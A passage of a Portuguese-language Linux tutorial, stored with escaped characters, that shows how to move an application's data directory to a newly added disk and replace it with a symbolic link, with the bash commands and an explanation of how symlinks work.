parti\xe7\xe3o raiz configurada, diante disso, podemos fazer a sua aplica\xe7\xe3o achar que est\xe1 armazenando no `/var/aplica\xe7\xe3o` , quando na verdade, esta sendo usado o espa\xe7o dispon\xedvel no disco rec\xe9m adicionado (referenciado na imagem, como `/dev/sdb1`).\\n\\n![disk2](./disk2.png)\\n\\nAdicione o novo disco, monte em um diret\xf3rio qualquer, pare a sua aplica\xe7\xe3o, e mova os arquivos para o novo diret\xf3rio (talvez bata um medo, rsrs):\\n\\n```bash\\n/etc/init.d/aplica\xe7\xe3o stop\\nmv /var/aplica\xe7\xe3o /disconovo\\nln -s /disconovo/aplica\xe7\xe3o /var/\\n```\\n\\nAgora `/var/aplica\xe7\xe3o` \xe9 apenas um link simb\xf3lico, como um atalho na sua \xe1rea de trabalho.\\n\\n![disk3](./disk3.png)\\n\\nSe voc\xea fizer `ln -s /var/aplicacao /var/link`, ent\xe3o `/var/link` ser\xe1 um arquivo que ir\xe1 fazer referencia ao conte\xfado de `/var/aplicacao`. Logo `ls /var/link`, tentar\xe1 obter uma listagem de diret\xf3rios para `/var/link`, e o sistema devolver\xe1 uma listagem do conte\xfado de `/var/aplicacao`.\\n\\nO mesmo serve na hora de escrever os arquivos."}]}')}}]);